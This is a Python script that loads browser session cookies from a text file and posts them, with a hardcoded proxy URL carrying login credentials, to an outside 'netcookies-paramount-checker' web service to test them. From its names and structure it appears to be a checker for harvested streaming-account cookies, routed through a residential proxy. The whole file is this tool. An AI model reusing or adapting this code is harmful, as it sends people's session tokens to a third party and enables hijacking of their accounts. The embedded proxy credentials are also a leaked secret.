import json
import urllib.error
import urllib.request
from pathlib import Path

proxy = "http://xuan123_Nkus-country-US-ssid-oCVWv1K7aM:huy1234@niceproxy.io:17521"
path = Path("dddd.txt")

cookies = []
for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
    line = line.strip()
    if not line or line.startswith("#"):
        continue
    parts = [p.strip() for p in line.split("\t")]
    if len(parts) < 7:
        continue

    domain, flag, pth, secure, expiry, name, value = parts[:7]
    cookies.append({
        "domain": domain,
        "flag": flag,
        "path": pth,
        "secure": secure.upper() == "TRUE",
        "expiry": expiry,
        "name": name,
        "value": value,
    })

payload = {
    "proxy_url": proxy,
    "cookies": cookies,
}

url = "https://netcookies-paramount-checker.onrender.com/validate"
req = urllib.request.Request(
    url,
    data=json.dumps(payload).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    method="POST",
)

try:
    with urllib.request.urlopen(req, timeout=180) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        print("STATUS:", resp.status)
        print(body)
except urllib.error.HTTPError as e:
    body = e.read().decode("utf-8", errors="replace")
    print(f"HTTP ERROR {e.code} for {url}")
    print(body)
    raise